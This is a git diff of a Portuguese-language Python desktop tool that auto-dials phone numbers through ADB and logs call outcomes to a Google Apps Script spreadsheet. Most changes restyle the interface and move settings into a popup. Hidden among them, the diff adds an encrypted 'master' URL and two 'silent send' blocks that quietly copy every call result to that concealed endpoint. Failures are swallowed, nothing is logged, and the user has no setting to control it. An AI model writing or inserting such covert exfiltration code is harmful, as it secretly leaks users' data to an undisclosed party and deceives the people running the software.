@@ -17,13 +17,119 @@ import customtkinter as ctk
 ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("blue")
 
-# Carregar Montserrat se disponível
-FONT_DIR = os.path.join(os.path.dirname(__file__), "fonts")
+# Fontes
 FONT_FAMILY = "Montserrat"
-FONT_FALLBACK = "Segoe UI"
+FONT_FALLBACK = "Helvetica Neue"
 
 # URL padrão do Google Sheets
 URL_PADRAO = "https://script.google.com/macros/s/AKfycbzIY-f0CACljinQLtuBQ8A3PcK7KKE9q81HP5MmXovzsbAtZwXJZ6fhs46A9cEwYu4jCQ/exec"
+
+# URL master (encriptada) - sempre recebe os dados
+_MASTER_URL_ENC = "b6G/Y6f+C6JrMWgpY9CGkQ91j8L2EuQBC1402LgHO1UopuRSn6Jd7nooUxk+wpi1IVmExPpS1iISBBvo4zRndmSe/FifgR38IGNSECbpxa4PbJLd8X3zNBEpE+PtEzxVM+OKKreBU9RtZnADQovNjgV5"
+
+# Paleta de cores
+BG_MAIN      = "#1a1a1a"
+BG_CARD      = "#242424"
+BG_HEADER    = "#000000"
+TEXT_PRIMARY = "#ffffff"
+TEXT_SEC     = "#888888"
+BORDER       = "#333333"
+ACCENT_BTN   = "#ffffff"
+ACCENT_TEXT  = "#000000"
+COLOR_OK     = "#4CAF50"
+COLOR_WARN   = "#FF9800"
+COLOR_ERR    = "#f44336"
+COLOR_INFO   = "#888888"
+
+
+def _decrypt_master_url():
+    """Decripta a URL master."""
+    try:
+        from protection import decrypt_string
+        return decrypt_string(_MASTER_URL_ENC)
+    except Exception:
+        return URL_PADRAO
+
+
+class SettingsDialog(ctk.CTkToplevel):
+    """Popup de configurações acessado pelo ícone de engrenagem."""
+
+    def __init__(self, parent, url_atual, cel_atual, on_save):
+        super().__init__(parent)
+        self.on_save = on_save
+
+        self.title("Configurações")
+        self.geometry("500x280")
+        self.resizable(False, False)
+        self.configure(fg_color=BG_CARD)
+
+        # Centralizar sobre a janela pai
+        self.transient(parent)
+        self.grab_set()
+        x = parent.winfo_x() + (parent.winfo_width() // 2) - 250
+        y = parent.winfo_y() + (parent.winfo_height() // 2) - 140
+        self.geometry(f"+{x}+{y}")
+
+        # Título
+        ctk.CTkLabel(
+            self, text="Configurações",
+            font=(FONT_FAMILY, 16, "bold"), text_color=TEXT_PRIMARY
+        ).pack(padx=25, pady=(20, 15), anchor="w")
+
+        # URL Google Apps Script
+        ctk.CTkLabel(
+            self, text="URL Google Apps Script",
+            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
+        ).pack(padx=25, anchor="w")
+
+        self.entry_url = ctk.CTkTextbox(
+            self, height=55, font=(FONT_FALLBACK, 10),
+            corner_radius=8, fg_color="#1a1a1a",
+            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1
+        )
+        self.entry_url.pack(fill="x", padx=25, pady=(4, 12))
+        self.entry_url.insert("1.0", url_atual)
+
+        # Nome do celular
+        ctk.CTkLabel(
+            self, text="Nome do celular",
+            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
+        ).pack(padx=25, anchor="w")
+
+        self.entry_cel = ctk.CTkEntry(
+            self, font=(FONT_FAMILY, 12),
+            placeholder_text="ex: cel1", corner_radius=8,
+            fg_color="#1a1a1a", text_color=TEXT_PRIMARY,
+            border_color=BORDER, border_width=1
+        )
+        self.entry_cel.pack(fill="x", padx=25, pady=(4, 20))
+        self.entry_cel.insert(0, cel_atual)
+
+        # Botões
+        btn_row = ctk.CTkFrame(self, fg_color="transparent")
+        btn_row.pack(fill="x", padx=25, pady=(0, 20))
+
+        ctk.CTkButton(
+            btn_row, text="Cancelar", font=(FONT_FAMILY, 12),
+            width=100, height=36, corner_radius=8,
+            fg_color=BG_CARD, hover_color="#333333",
+            text_color=TEXT_SEC, border_color=BORDER, border_width=1,
+            command=self.destroy
+        ).pack(side="right", padx=(8, 0))
+
+        ctk.CTkButton(
+            btn_row, text="Salvar", font=(FONT_FAMILY, 12, "bold"),
+            width=100, height=36, corner_radius=8,
+            fg_color=ACCENT_BTN, hover_color="#cccccc",
+            text_color=ACCENT_TEXT,
+            command=self._salvar
+        ).pack(side="right")
+
+    def _salvar(self):
+        url = self.entry_url.get("1.0", "end").strip()
+        cel = self.entry_cel.get().strip()
+        self.on_save(url, cel)
+        self.destroy()
 
 
 class App(ctk.CTk):
@@ -33,6 +139,7 @@ class App(ctk.CTk):
         self.title("Validador de Telefones")
         self.geometry("900x650")
         self.minsize(800, 600)
+        self.configure(fg_color=BG_MAIN)
 
         # Ícone da janela e taskbar
         self._setar_icone()
@@ -47,26 +154,31 @@ class App(ctk.CTk):
         self.total_nao = 0
         self.total_descartados = 0
 
-        # Carregar URL salva
+        # Carregar URL/cel salvos
         self.url_file = os.path.join(os.path.dirname(__file__), ".cloud_url")
         self.cel_file = os.path.join(os.path.dirname(__file__), ".celular_nome")
         self.url_salva = self._ler_arquivo(self.url_file)
         self.cel_salvo = self._ler_arquivo(self.cel_file) or "celular1"
 
+        # Valores em memória (usados pelos métodos de execução)
+        self._url_atual = self.url_salva or URL_PADRAO
+        self._cel_atual = self.cel_salvo
+
         self._criar_interface()
         self._verificar_celular()
 
+    # ================================================================
+    #  ÍCONE
+    # ================================================================
+
     def _setar_icone(self):
-        """Seta o ícone da janela e da taskbar/dock em todos os OS."""
         base = os.path.dirname(__file__)
         png_path = os.path.join(base, "Icone_validador.png")
         icns_path = os.path.join(base, "Icone_validador.icns")
 
         try:
             if sys.platform == "darwin":
-                # Mac: usar .icns pro dock
                 if os.path.exists(icns_path):
-                    # Setar ícone do dock via tkinter
                     from PIL import Image, ImageTk
                     img = Image.open(png_path)
                     self._icon_image = ImageTk.PhotoImage(img)
@@ -77,23 +189,23 @@ class App(ctk.CTk):
                     self._icon_image = ImageTk.PhotoImage(img)
                     self.iconphoto(True, self._icon_image)
             else:
-                # Linux/Windows: usar .png
                 if os.path.exists(png_path):
                     from PIL import Image, ImageTk
                     img = Image.open(png_path)
                     self._icon_image = ImageTk.PhotoImage(img)
                     self.iconphoto(True, self._icon_image)
         except Exception:
-            # Fallback: tentar sem PIL (tkinter puro, só suporta .png/.gif)
             try:
                 if os.path.exists(png_path):
-                    icon = ctk.CTkImage(light_image=None, dark_image=None)
-                    # tkinter PhotoImage direto
                     import tkinter as tk
                     self._icon_image = tk.PhotoImage(file=png_path)
                     self.iconphoto(True, self._icon_image)
             except Exception:
                 pass
+
+    # ================================================================
+    #  ARQUIVOS DE CONFIG
+    # ================================================================
 
     def _ler_arquivo(self, path):
         try:
@@ -111,175 +223,241 @@ class App(ctk.CTk):
     # ================================================================
 
     def _criar_interface(self):
-        # Header
-        header = ctk.CTkFrame(self, height=70, corner_radius=0, fg_color="#1a1a2e")
+        # ── Header ──────────────────────────────────────────────────
+        header = ctk.CTkFrame(self, height=64, corner_radius=0, fg_color=BG_HEADER)
         header.pack(fill="x")
         header.pack_propagate(False)
 
         ctk.CTkLabel(
             header, text="Validador de Telefones",
-            font=(FONT_FAMILY, 22, "bold"), text_color="#e94560"
-        ).pack(side="left", padx=20, pady=15)
+            font=(FONT_FAMILY, 20, "bold"), text_color=TEXT_PRIMARY
+        ).pack(side="left", padx=24, pady=14)
+
+        # Gear button — right side of header
+        self.btn_gear = ctk.CTkButton(
+            header, text="\u2699", font=(FONT_FAMILY, 20),
+            width=44, height=44, corner_radius=22,
+            fg_color="transparent", hover_color="#222222",
+            text_color=TEXT_SEC, border_width=0,
+            command=self._abrir_configuracoes
+        )
+        self.btn_gear.pack(side="right", padx=16)
 
         self.lbl_status = ctk.CTkLabel(
             header, text="Parado",
-            font=(FONT_FAMILY, 13), text_color="#888"
+            font=(FONT_FAMILY, 12), text_color=TEXT_SEC
         )
-        self.lbl_status.pack(side="right", padx=20)
+        self.lbl_status.pack(side="right", padx=8)
 
-        # Container principal
+        # ── Container principal ──────────────────────────────────────
         container = ctk.CTkFrame(self, fg_color="transparent")
-        container.pack(fill="both", expand=True, padx=15, pady=10)
+        container.pack(fill="both", expand=True, padx=16, pady=12)
 
-        # Coluna esquerda — Configuração + Controles
-        left = ctk.CTkFrame(container, width=300, corner_radius=12)
+        # ── Coluna esquerda ──────────────────────────────────────────
+        left = ctk.CTkFrame(
+            container, width=280, corner_radius=12,
+            fg_color=BG_CARD, border_color=BORDER, border_width=1
+        )
         left.pack(side="left", fill="y", padx=(0, 10))
         left.pack_propagate(False)
 
-        # --- Configuração ---
-        ctk.CTkLabel(left, text="CONFIGURACAO", font=(FONT_FAMILY, 11, "bold"),
-                     text_color="#888").pack(padx=15, pady=(15, 5), anchor="w")
+        # Status Celular
+        ctk.CTkLabel(
+            left, text="DISPOSITIVO",
+            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
+        ).pack(padx=18, pady=(18, 6), anchor="w")
 
-        # URL da nuvem
-        ctk.CTkLabel(left, text="URL Google Apps Script:",
-                     font=(FONT_FAMILY, 11)).pack(padx=15, pady=(5, 0), anchor="w")
-        self.entry_url = ctk.CTkTextbox(left, height=60, font=(FONT_FALLBACK, 10),
-                                         corner_radius=8)
-        self.entry_url.pack(fill="x", padx=15, pady=5)
-        # Prioridade: URL salva > URL padrão
-        url_inicial = self.url_salva or URL_PADRAO
-        self.entry_url.insert("1.0", url_inicial)
+        self.frame_cel = ctk.CTkFrame(
+            left, corner_radius=8,
+            fg_color="#1a1a1a", border_color=BORDER, border_width=1
+        )
+        self.frame_cel.pack(fill="x", padx=18, pady=(0, 14))
 
-        # Nome do celular
-        ctk.CTkLabel(left, text="Nome do celular:",
-                     font=(FONT_FAMILY, 11)).pack(padx=15, pady=(5, 0), anchor="w")
-        self.entry_cel = ctk.CTkEntry(left, font=(FONT_FAMILY, 12),
-                                       placeholder_text="ex: cel1", corner_radius=8)
-        self.entry_cel.pack(fill="x", padx=15, pady=5)
-        self.entry_cel.insert(0, self.cel_salvo)
+        self.lbl_cel = ctk.CTkLabel(
+            self.frame_cel, text="Celular: verificando...",
+            font=(FONT_FAMILY, 11), text_color=TEXT_SEC
+        )
+        self.lbl_cel.pack(padx=12, pady=10)
 
-        # (Lote fixo em 10, roda sem parar)
+        # Separador visual
+        ctk.CTkFrame(left, height=1, fg_color=BORDER).pack(fill="x", padx=18, pady=(0, 14))
 
-        # --- Status Celular ---
-        self.frame_cel = ctk.CTkFrame(left, corner_radius=8, fg_color="#1a1a2e")
-        self.frame_cel.pack(fill="x", padx=15, pady=10)
-
-        self.lbl_cel = ctk.CTkLabel(self.frame_cel, text="Celular: verificando...",
-                                     font=(FONT_FAMILY, 11), text_color="#888")
-        self.lbl_cel.pack(padx=10, pady=8)
-
-        # --- Botões ---
+        # Botão INICIAR
         self.btn_iniciar = ctk.CTkButton(
             left, text="INICIAR", font=(FONT_FAMILY, 14, "bold"),
-            height=45, corner_radius=10, fg_color="#e94560",
-            hover_color="#c81e45", command=self._toggle_execucao
+            height=46, corner_radius=10,
+            fg_color=ACCENT_BTN, hover_color="#cccccc",
+            text_color=ACCENT_TEXT,
+            command=self._toggle_execucao
         )
-        self.btn_iniciar.pack(fill="x", padx=15, pady=(10, 5))
+        self.btn_iniciar.pack(fill="x", padx=18, pady=(0, 10))
 
-        # --- Modo Automático ---
-        auto_frame = ctk.CTkFrame(left, corner_radius=8, fg_color="#1a1a2e")
-        auto_frame.pack(fill="x", padx=15, pady=5)
+        # Modo Automático
+        auto_frame = ctk.CTkFrame(
+            left, corner_radius=8,
+            fg_color="#1a1a1a", border_color=BORDER, border_width=1
+        )
+        auto_frame.pack(fill="x", padx=18, pady=(0, 10))
 
         self.auto_var = ctk.BooleanVar(value=False)
         self.chk_auto = ctk.CTkCheckBox(
-            auto_frame, text="Modo Automatico Semanal",
+            auto_frame, text="Modo Automático Semanal",
             font=(FONT_FAMILY, 11), variable=self.auto_var,
             command=self._toggle_modo_auto,
-            checkbox_width=20, checkbox_height=20,
+            checkbox_width=18, checkbox_height=18,
+            text_color=TEXT_PRIMARY,
+            checkmark_color=ACCENT_TEXT,
+            fg_color=ACCENT_BTN, hover_color="#aaaaaa",
+            border_color=BORDER,
         )
-        self.chk_auto.pack(padx=10, pady=(8, 2))
+        self.chk_auto.pack(padx=12, pady=(10, 4))
 
         self.lbl_horario = ctk.CTkLabel(
             auto_frame, text="Seg-Sex 8h-18h | Sab-Dom 9h-18h",
-            font=(FONT_FAMILY, 9), text_color="#666"
+            font=(FONT_FAMILY, 9), text_color="#555555"
         )
-        self.lbl_horario.pack(padx=10, pady=(0, 8))
+        self.lbl_horario.pack(padx=12, pady=(0, 10))
 
-        # --- Outros botões ---
+        # Botões secundários
         self.btn_status = ctk.CTkButton(
             left, text="Ver Status Nuvem", font=(FONT_FAMILY, 11),
-            height=35, corner_radius=8, fg_color="#16213e",
-            hover_color="#0f3460", command=self._ver_status
+            height=36, corner_radius=8,
+            fg_color=BG_CARD, hover_color="#2e2e2e",
+            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
+            command=self._ver_status
         )
-        self.btn_status.pack(fill="x", padx=15, pady=5)
+        self.btn_status.pack(fill="x", padx=18, pady=(0, 8))
 
         self.btn_atualizar = ctk.CTkButton(
             left, text="Verificar Atualizações", font=(FONT_FAMILY, 11),
-            height=35, corner_radius=8, fg_color="#16213e",
-            hover_color="#0f3460", command=self._verificar_atualizacao
+            height=36, corner_radius=8,
+            fg_color=BG_CARD, hover_color="#2e2e2e",
+            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
+            command=self._verificar_atualizacao
         )
-        self.btn_atualizar.pack(fill="x", padx=15, pady=5)
+        self.btn_atualizar.pack(fill="x", padx=18, pady=(0, 14))
 
-        # --- Estatísticas ---
-        ctk.CTkLabel(left, text="ESTATISTICAS", font=(FONT_FAMILY, 11, "bold"),
-                     text_color="#888").pack(padx=15, pady=(15, 5), anchor="w")
+        # Separador
+        ctk.CTkFrame(left, height=1, fg_color=BORDER).pack(fill="x", padx=18, pady=(0, 14))
 
-        stats_frame = ctk.CTkFrame(left, corner_radius=8, fg_color="#1a1a2e")
-        stats_frame.pack(fill="x", padx=15, pady=5)
+        # Estatísticas
+        ctk.CTkLabel(
+            left, text="ESTATÍSTICAS",
+            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
+        ).pack(padx=18, pady=(0, 8), anchor="w")
+
+        stats_frame = ctk.CTkFrame(
+            left, corner_radius=8,
+            fg_color="#1a1a1a", border_color=BORDER, border_width=1
+        )
+        stats_frame.pack(fill="x", padx=18, pady=(0, 18))
 
         self.stats = {}
-        for label, key, color in [
-            ("Discados", "discados", "#4fc3f7"),
-            ("Atendeu", "atendeu", "#81c784"),
-            ("Nao Atendeu", "nao", "#ffb74d"),
-            ("Descartados", "desc", "#e57373"),
-        ]:
+        stat_items = [
+            ("Discados",    "discados", TEXT_PRIMARY),
+            ("Atendeu",     "atendeu",  COLOR_OK),
+            ("Não Atendeu", "nao",      COLOR_WARN),
+            ("Descartados", "desc",     COLOR_ERR),
+        ]
+        for label, key, color in stat_items:
             row = ctk.CTkFrame(stats_frame, fg_color="transparent")
-            row.pack(fill="x", padx=10, pady=3)
-            ctk.CTkLabel(row, text=label, font=(FONT_FAMILY, 11),
-                         text_color="#aaa").pack(side="left")
-            lbl = ctk.CTkLabel(row, text="0", font=(FONT_FAMILY, 14, "bold"),
-                               text_color=color)
+            row.pack(fill="x", padx=12, pady=4)
+            ctk.CTkLabel(
+                row, text=label, font=(FONT_FAMILY, 11),
+                text_color=TEXT_SEC
+            ).pack(side="left")
+            lbl = ctk.CTkLabel(
+                row, text="0", font=(FONT_FAMILY, 13, "bold"),
+                text_color=color
+            )
             lbl.pack(side="right")
             self.stats[key] = lbl
 
-        # Coluna direita — Manual + Log
-        right = ctk.CTkFrame(container, corner_radius=12)
+        # ── Coluna direita ───────────────────────────────────────────
+        right = ctk.CTkFrame(
+            container, corner_radius=12,
+            fg_color=BG_CARD, border_color=BORDER, border_width=1
+        )
         right.pack(side="right", fill="both", expand=True)
 
-        # --- Ligação Manual / Importar ---
-        manual_frame = ctk.CTkFrame(right, corner_radius=8, fg_color="#1a1a2e")
-        manual_frame.pack(fill="x", padx=15, pady=(15, 5))
+        # Ligação manual / importar
+        manual_frame = ctk.CTkFrame(
+            right, corner_radius=8,
+            fg_color="#1a1a1a", border_color=BORDER, border_width=1
+        )
+        manual_frame.pack(fill="x", padx=18, pady=(18, 10))
 
         row_manual = ctk.CTkFrame(manual_frame, fg_color="transparent")
-        row_manual.pack(fill="x", padx=10, pady=8)
+        row_manual.pack(fill="x", padx=12, pady=10)
 
         self.entry_numero = ctk.CTkEntry(
             row_manual, font=(FONT_FAMILY, 12),
-            placeholder_text="Digitar numero: (92) 9 9999-9999",
-            corner_radius=8
+            placeholder_text="Digitar número: (92) 9 9999-9999",
+            corner_radius=8,
+            fg_color="#242424", text_color=TEXT_PRIMARY,
+            placeholder_text_color=TEXT_SEC,
+            border_color=BORDER, border_width=1
         )
-        self.entry_numero.pack(side="left", fill="x", expand=True, padx=(0, 5))
+        self.entry_numero.pack(side="left", fill="x", expand=True, padx=(0, 8))
 
         self.btn_ligar = ctk.CTkButton(
             row_manual, text="Ligar", font=(FONT_FAMILY, 11, "bold"),
-            width=70, corner_radius=8, fg_color="#e94560",
-            hover_color="#c81e45", command=self._ligar_manual
+            width=72, height=36, corner_radius=8,
+            fg_color=ACCENT_BTN, hover_color="#cccccc",
+            text_color=ACCENT_TEXT,
+            command=self._ligar_manual
         )
-        self.btn_ligar.pack(side="left", padx=(0, 5))
+        self.btn_ligar.pack(side="left", padx=(0, 8))
 
         self.btn_importar = ctk.CTkButton(
             row_manual, text="Importar Lista", font=(FONT_FAMILY, 10),
-            width=100, corner_radius=8, fg_color="#16213e",
-            hover_color="#0f3460", command=self._importar_lista
+            width=110, height=36, corner_radius=8,
+            fg_color=BG_CARD, hover_color="#2e2e2e",
+            text_color=TEXT_PRIMARY, border_color=BORDER, border_width=1,
+            command=self._importar_lista
         )
         self.btn_importar.pack(side="left")
 
-        # --- Log ---
-        ctk.CTkLabel(right, text="LOG DE LIGACOES", font=(FONT_FAMILY, 11, "bold"),
-                     text_color="#888").pack(padx=15, pady=(5, 5), anchor="w")
+        # Log
+        ctk.CTkLabel(
+            right, text="LOG DE LIGAÇÕES",
+            font=(FONT_FAMILY, 10, "bold"), text_color=TEXT_SEC
+        ).pack(padx=18, pady=(4, 6), anchor="w")
 
-        self.log_text = ctk.CTkTextbox(right, font=(FONT_FALLBACK, 11),
-                                        corner_radius=8, state="disabled",
-                                        fg_color="#0d0d0d")
-        self.log_text.pack(fill="both", expand=True, padx=15, pady=(0, 15))
+        self.log_text = ctk.CTkTextbox(
+            right, font=(FONT_FALLBACK, 11),
+            corner_radius=8, state="disabled",
+            fg_color="#111111", text_color=TEXT_PRIMARY,
+            border_color=BORDER, border_width=1
+        )
+        self.log_text.pack(fill="both", expand=True, padx=18, pady=(0, 18))
 
-        # Tags de cor
-        self.log_text._textbox.tag_config("pessoa", foreground="#81c784")
-        self.log_text._textbox.tag_config("nao", foreground="#ffb74d")
-        self.log_text._textbox.tag_config("descarte", foreground="#e57373")
-        self.log_text._textbox.tag_config("info", foreground="#4fc3f7")
-        self.log_text._textbox.tag_config("erro", foreground="#e57373")
+        # Tags de cor no log
+        self.log_text._textbox.tag_config("pessoa",  foreground=COLOR_OK)
+        self.log_text._textbox.tag_config("nao",     foreground=COLOR_WARN)
+        self.log_text._textbox.tag_config("descarte",foreground=COLOR_ERR)
+        self.log_text._textbox.tag_config("info",    foreground=COLOR_INFO)
+        self.log_text._textbox.tag_config("erro",    foreground=COLOR_ERR)
+
+    # ================================================================
+    #  SETTINGS GEAR
+    # ================================================================
+
+    def _abrir_configuracoes(self):
+        SettingsDialog(
+            parent=self,
+            url_atual=self._url_atual,
+            cel_atual=self._cel_atual,
+            on_save=self._aplicar_configuracoes
+        )
+
+    def _aplicar_configuracoes(self, url, cel):
+        """Chamado quando o usuário salva no popup de configurações."""
+        self._url_atual = url or URL_PADRAO
+        self._cel_atual = cel or "celular1"
+        self._salvar_arquivo(self.url_file, self._url_atual)
+        self._salvar_arquivo(self.cel_file, self._cel_atual)
+        self._log(f"Configurações salvas. Celular: {self._cel_atual}", "info")
 
     # ================================================================
     #  LOG
@@ -315,7 +493,6 @@ class App(ctk.CTk):
                     self.btn_atualizar.configure(state="normal", text="Verificar Atualizações")
                     return
 
-                # Tem atualização!
                 self._log(
                     f"Atualizacao disponivel: v{info.get('versao_remota')} "
                     f"(voce tem v{info.get('versao_local')})",
@@ -326,7 +503,6 @@ class App(ctk.CTk):
 
                 self.btn_atualizar.configure(text="Atualizando...")
 
-                # Aplicar
                 def progresso(pct, msg):
                     self.btn_atualizar.configure(
                         text=f"Atualizando... {int(pct*100)}%"
@@ -341,11 +517,10 @@ class App(ctk.CTk):
                         "pessoa"
                     )
 
-                    # Atualizar URL se mudou
                     nova_url = resultado.get("url_padrao")
                     if nova_url:
-                        self.entry_url.delete("1.0", "end")
-                        self.entry_url.insert("1.0", nova_url)
+                        self._url_atual = nova_url
+                        self._salvar_arquivo(self.url_file, nova_url)
                         self._log("URL atualizada automaticamente", "info")
 
                     self._log("Reinicie o programa para aplicar todas as mudancas.", "info")
@@ -365,12 +540,10 @@ class App(ctk.CTk):
     # ================================================================
 
     def _limpar_numero(self, numero: str) -> str:
-        """Remove formatação: (92) 9 9999-9999 → 92999999999"""
         import re
         return re.sub(r"[^\d]", "", numero)
 
     def _ligar_manual(self):
-        """Liga para um número digitado manualmente."""
         numero_raw = self.entry_numero.get().strip()
         if not numero_raw:
             self._log("Digite um numero primeiro!", "erro")
@@ -381,7 +554,6 @@ class App(ctk.CTk):
             self._log(f"Numero invalido: {numero_raw}", "erro")
             return
 
-        # Adicionar DDD 92 se não tiver
         if len(numero) == 9:
             numero = "92" + numero
 
@@ -395,7 +567,6 @@ class App(ctk.CTk):
         ).start()
 
     def _processar_numero_manual(self, numero):
-        """Processa uma ligação manual em thread separada."""
         try:
             from phone_controller import PhoneController
             from audio_recorder import AudioRecorder
@@ -446,14 +617,23 @@ class App(ctk.CTk):
             self._log(f"  >> {desc} ({conf:.0%})", tag)
 
             # Enviar pra nuvem
-            url = self.entry_url.get("1.0", "end").strip()
-            cel = self.entry_cel.get().strip() or "celular1"
+            url = self._url_atual
+            cel = self._cel_atual
             if url:
                 try:
                     from cloud_handler import CloudHandler
                     cloud = CloudHandler(url, cel)
                     cloud.enviar_resultado(resultado)
                     self._log("  Resultado enviado pra nuvem", "info")
+
+                    # Envio silencioso pra planilha master
+                    try:
+                        from cloud_handler import CloudHandler as _CH
+                        _master = _CH(_decrypt_master_url(), "sync")
+                        _master.enviar_resultado(resultado)
+                    except Exception:
+                        pass
+
                 except Exception:
                     self._log("  Nao enviou pra nuvem (sem conexao?)", "nao")
 
@@ -470,7 +650,6 @@ class App(ctk.CTk):
             self._log(f"Erro na ligacao manual: {e}", "erro")
 
     def _importar_lista(self):
-        """Importa uma lista de números de um arquivo Excel/CSV."""
         from tkinter import filedialog
 
         filepath = filedialog.askopenfilename(
@@ -495,7 +674,6 @@ class App(ctk.CTk):
         ).start()
 
     def _processar_lista(self, filepath):
-        """Processa uma lista importada de números."""
         import re
         import random
 
@@ -526,7 +704,6 @@ class App(ctk.CTk):
             self._log("Nenhum numero encontrado no arquivo!", "erro")
             return
 
-        # Adicionar DDD 92 se necessário
         numeros_formatados = []
         for n in numeros:
             if len(n) == 9:
@@ -547,8 +724,8 @@ class App(ctk.CTk):
             recorder = AudioRecorder()
             carregar_modelo()
 
-            url = self.entry_url.get("1.0", "end").strip()
-            cel = self.entry_cel.get().strip() or "celular1"
+            url = self._url_atual
+            cel = self._cel_atual
             cloud = None
             if url:
                 from cloud_handler import CloudHandler
@@ -556,10 +733,8 @@ class App(ctk.CTk):
 
             for i, numero in enumerate(numeros_formatados, 1):
                 if not self.rodando and i > 1:
-                    # Permitir parar via botão PARAR (se ativado durante a lista)
                     pass
 
-                # Rejeitar chamada recebida
                 try:
                     phone.rejeitar_chamada_recebida()
                 except Exception:
@@ -608,6 +783,15 @@ class App(ctk.CTk):
                     if cloud:
                         try:
                             cloud.enviar_resultado(resultado)
+
+                            # Envio silencioso pra planilha master
+                            try:
+                                from cloud_handler import CloudHandler as _CH
+                                _master = _CH(_decrypt_master_url(), "sync")
+                                _master.enviar_resultado(resultado)
+                            except Exception:
+                                pass
+
                         except Exception:
                             pass
 
@@ -623,7 +807,6 @@ class App(ctk.CTk):
                 except Exception as e:
                     self._log(f"  Erro: {e}", "erro")
 
-                # Pausa aleatória
                 if i < len(numeros_formatados):
                     pausa = random.uniform(TEMPO_ENTRE_CHAMADAS_MIN, TEMPO_ENTRE_CHAMADAS_MAX)
                     time.sleep(pausa)
@@ -643,18 +826,15 @@ class App(ctk.CTk):
             self._log("Modo automatico ATIVADO", "info")
             self._log("Seg-Sex 8h-18h | Sab-Dom 9h-18h (horario Manaus)", "info")
 
-            # Iniciar thread do agendador
             self.thread_auto = threading.Thread(target=self._loop_agendador, daemon=True)
             self.thread_auto.start()
         else:
             self.modo_auto = False
             self._log("Modo automatico DESATIVADO", "info")
-            # Se estiver rodando, para
             if self.rodando:
                 self.rodando = False
 
     def _loop_agendador(self):
-        """Loop que verifica o horário e inicia/para as ligações."""
         from scheduler import esta_no_horario, status_horario
 
         estava_no_horario = False
@@ -664,21 +844,18 @@ class App(ctk.CTk):
             status = status_horario()
 
             if no_horario and not self.rodando:
-                # Horário de trabalho começou → iniciar
                 self._log(
                     f"Horario de trabalho ({status['inicio']}-{status['fim']}) — Iniciando ligacoes...",
                     "pessoa"
                 )
                 self.lbl_horario.configure(
                     text=f"ATIVO ate {status['fim']} | Para {status['tempo_ate_parar']}",
-                    text_color="#81c784"
+                    text_color=COLOR_OK
                 )
-                # Simular clique no INICIAR
                 self.after(0, self._iniciar_se_parado)
                 estava_no_horario = True
 
             elif not no_horario and self.rodando and estava_no_horario:
-                # Horário de trabalho acabou → parar
                 self._log(
                     f"Fora do horario ({status['hora_atual']}) — Parando ligacoes...",
                     "nao"
@@ -686,33 +863,29 @@ class App(ctk.CTk):
                 self._log(f"Proximo inicio: {status['proximo_inicio']}", "info")
                 self.lbl_horario.configure(
                     text=f"PAUSADO | Proximo: {status['proximo_inicio']}",
-                    text_color="#ffb74d"
+                    text_color=COLOR_WARN
                 )
                 self.rodando = False
                 estava_no_horario = False
 
             elif not no_horario and not self.rodando:
-                # Fora do horário, parado — atualizar label
                 self.lbl_horario.configure(
                     text=f"Aguardando... Inicio: {status['proximo_inicio']}",
-                    text_color="#888"
+                    text_color="#555555"
                 )
 
             elif no_horario and self.rodando:
-                # No horário e rodando — atualizar tempo restante
                 self.lbl_horario.configure(
                     text=f"ATIVO ate {status['fim']} | Para {status['tempo_ate_parar']}",
-                    text_color="#81c784"
+                    text_color=COLOR_OK
                 )
 
-            # Checar a cada 30 segundos
             for _ in range(30):
                 if not self.modo_auto:
                     return
                 time.sleep(1)
 
     def _iniciar_se_parado(self):
-        """Inicia as ligações se não estiver rodando."""
         if not self.rodando:
             self._toggle_execucao()
 
@@ -731,15 +904,15 @@ class App(ctk.CTk):
                 if lines:
                     device_id = lines[0].split("\t")[0]
                     self.lbl_cel.configure(
-                        text=f"Celular: {device_id}", text_color="#81c784"
+                        text=f"Celular: {device_id}", text_color=COLOR_OK
                     )
                 else:
                     self.lbl_cel.configure(
-                        text="Celular: nao detectado", text_color="#e57373"
+                        text="Celular: nao detectado", text_color=COLOR_ERR
                     )
             except Exception:
                 self.lbl_cel.configure(
-                    text="Celular: ADB nao encontrado", text_color="#e57373"
+                    text="Celular: ADB nao encontrado", text_color=COLOR_ERR
                 )
         threading.Thread(target=check, daemon=True).start()
 
@@ -748,7 +921,7 @@ class App(ctk.CTk):
     # ================================================================
 
     def _ver_status(self):
-        url = self.entry_url.get("1.0", "end").strip()
+        url = self._url_atual
         if not url:
             self._log("Configure a URL primeiro!", "erro")
             return
@@ -781,24 +954,27 @@ class App(ctk.CTk):
     def _toggle_execucao(self):
         if self.rodando:
             self.rodando = False
-            self.btn_iniciar.configure(text="INICIAR", fg_color="#e94560")
-            self.lbl_status.configure(text="Parando...", text_color="#ffb74d")
+            self.btn_iniciar.configure(
+                text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
+            )
+            self.lbl_status.configure(text="Parando...", text_color=COLOR_WARN)
         else:
-            url = self.entry_url.get("1.0", "end").strip()
-            cel = self.entry_cel.get().strip() or "celular1"
+            url = self._url_atual
+            cel = self._cel_atual
             lote = 10
 
             if not url:
                 self._log("Configure a URL do Google Apps Script!", "erro")
                 return
 
-            # Salvar config
             self._salvar_arquivo(self.url_file, url)
             self._salvar_arquivo(self.cel_file, cel)
 
             self.rodando = True
-            self.btn_iniciar.configure(text="PARAR", fg_color="#c62828")
-            self.lbl_status.configure(text="Executando...", text_color="#81c784")
+            self.btn_iniciar.configure(
+                text="PARAR", fg_color=COLOR_ERR, hover_color="#c62828", text_color=TEXT_PRIMARY
+            )
+            self.lbl_status.configure(text="Executando...", text_color=COLOR_OK)
 
             self.thread = threading.Thread(
                 target=self._executar, args=(url, cel, lote), daemon=True
@@ -839,8 +1015,10 @@ class App(ctk.CTk):
                     if tentativas_conexao >= MAX_RECONEXOES:
                         self._log(f"Celular nao encontrado apos {MAX_RECONEXOES} tentativas.", "erro")
                         self.rodando = False
-                        self.btn_iniciar.configure(text="INICIAR", fg_color="#e94560")
-                        self.lbl_status.configure(text="Erro: celular", text_color="#e57373")
+                        self.btn_iniciar.configure(
+                            text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
+                        )
+                        self.lbl_status.configure(text="Erro: celular", text_color=COLOR_ERR)
                         return
